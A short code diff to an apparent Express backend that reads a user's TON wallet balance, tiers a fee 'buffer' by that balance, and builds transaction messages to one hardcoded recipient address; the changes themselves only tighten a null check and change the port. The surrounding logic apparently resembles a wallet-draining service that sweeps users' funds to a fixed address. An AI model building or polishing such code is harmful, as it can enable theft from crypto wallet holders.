@@ -65,22 +65,22 @@ app.get("/transaction", async (req, res) => {
   const recipientAddress = "EQCxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
   const balanceNanoTon = await getWalletBalance(userWallet);
-  if (!balanceNanoTon) {
-    return res.status(500).json({ error: "Could not fetch balance" });
-  }
+if (balanceNanoTon === null || balanceNanoTon === undefined) {
+  return res.status(500).json({ error: "Could not fetch balance" });
+}
 
-  const balanceTon = balanceNanoTon / 1e9;
+const balanceTon = balanceNanoTon / 1e9;
 
-  if (balanceTon < 0.05) {
-    console.log(`⚠️ Balance too low (${balanceTon} TON). Not building transaction.`);
-    return res.json({
-      messages: [
-        { address: recipientAddress, amount: "0", payload: "" }
-      ],
-      raw: { from: userWallet, to: recipientAddress, amount: "0" }
-    });
-  }
-
+if (balanceTon < 0.05) {
+  console.log(`⚠️ Balance too low (${balanceTon} TON). Not building transaction.`);
+  return res.json({
+    messages: [
+      { address: recipientAddress, amount: "0", payload: "" }
+    ],
+    raw: { from: userWallet, to: recipientAddress, amount: "0" }
+  });
+}
+  
   let bufferTon = 0.05;
   if (balanceTon > 100) bufferTon = 0.8;
   else if (balanceTon > 10) bufferTon = 0.5;
@@ -126,7 +126,7 @@ app.post("/reject", (req, res) => {
 });
 
 // --- Start server ---
-const PORT = 7860;
+const PORT = 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Backend running at http://localhost:${PORT}`);
 });
